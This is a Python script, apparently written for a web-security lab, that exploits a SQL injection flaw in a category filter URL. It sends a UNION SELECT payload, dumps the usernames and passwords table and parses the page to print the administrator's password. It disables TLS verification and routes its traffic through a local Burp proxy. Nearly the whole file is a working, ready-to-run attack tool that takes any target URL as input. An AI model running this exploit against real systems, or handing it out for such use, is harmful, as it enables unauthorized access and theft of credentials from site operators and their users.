# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings
from bs4 import BeautifulSoup  # For parsing HTML content

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to exploit SQL injection vulnerability and extract administrator password
def exploit_sqli_users_table(url):
    # Define the target username and vulnerable path
    username = 'administrator'
    path = '/filter?category=Gifts'
    
    # Construct the SQL payload for extracting usernames and passwords
    sql_payload = "' UNION select username, password from users--"
    
    # Send a GET request with the SQL payload
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    
    # Check if the response contains the target username (administrator)
    if "administrator" in res:
        print("[+] Found the administrator password.")
        
        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Find the administrator password element based on the username
        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        print("[+] The administrator password is '%s'" % admin_password)
        return True  # Successful exploitation and password extraction
    
    return False  # Exploitation was unsuccessful

# Main program execution block
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get target URL from command-line arguments
    except IndexError:
        # Print usage instructions and exit if the argument is missing
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    # Step: Exploit SQL injection vulnerability to dump usernames and passwords
    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")